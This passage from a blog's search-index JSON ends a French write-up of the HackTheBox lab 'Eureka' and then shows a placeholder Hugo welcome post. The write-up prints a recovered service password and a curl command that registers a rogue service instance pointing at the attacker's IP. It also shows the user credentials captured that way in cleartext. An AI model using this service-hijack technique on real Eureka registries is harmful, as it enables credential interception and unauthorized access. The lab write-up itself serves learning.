EurekaSrvr password: 0scarPWDisTheB3st\nNous allons dÃ©ployer un service factice basÃ© sur lâ€™exemple \u0026ldquo;Hacking Netflix Eureka\u0026rdquo;, dans le but de simuler une prÃ©sence lÃ©gitime au sein de lâ€™environnement et dâ€™exploiter la confiance accordÃ©e aux services enregistrÃ©s.\ncurl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{ \u0026#34;instance\u0026#34;: { \u0026#34;instanceId\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;hostName\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;app\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;ipAddr\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;vipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;secureVipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;UP\u0026#34;, \u0026#34;port\u0026#34;: { \u0026#34;$\u0026#34;: 8081, \u0026#34;@enabled\u0026#34;: \u0026#34;true\u0026#34; }, \u0026#34;dataCenterInfo\u0026#34;: { \u0026#34;@class\u0026#34;: \u0026#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MyOwn\u0026#34; } } }\u0026#39; Nous avons rÃ©ussi Ã  extraire le nom d\u0026rsquo;utilisateur et le mot de passe associÃ©s au service ciblÃ©, ce qui permet une Ã©lÃ©vation des privilÃ¨ges ou un accÃ¨s non autorisÃ© aux ressources internes.\nusername=miranda.wise%40furni.htb\u0026amp;password=IL%21veT0Be%26BeT0L0ve\u0026amp;_csrf=JIVbCzoWJkTBdEsVTbZrxfWiTajQj9Lg9FvXWFIcckIGJ5AuQOM_aFknH3DsRigsLJtf88DBYMm1vefNwG7vYGd-SyA1QqhP ! password : IL!veT0Be\u0026amp;BeT0L0ve\nCyberChef - GCHQ\nHacking Netflix Eureka - Backbase\n","permalink":"https://nyobemichel.me/posts/eureka/","summary":"Difficulte : esay","title":"Eureka-HTB"},{"content":"Bienvenue dans mon premier article Hugo ! ğŸ‰\nPourquoi utiliser Hugo ? ğŸ’¨ Rapide ğŸ“„ BasÃ© sur Markdown ğŸ¨ Personnalisable avec des thÃ¨mes comme PaperMod Ce que tu peux faire Ajouter des images CrÃ©er des liens internes GÃ©nÃ©rer un site statique complet Exemple de code hugo new posts/mon-article.md ","permalink":"https://nyobemichel.me/posts/example/","summary":"Ceci est un exemple de post pour tester Hugo avec le thÃ¨me PaperMod.","title":"Bienvenue sur mon premier article"}]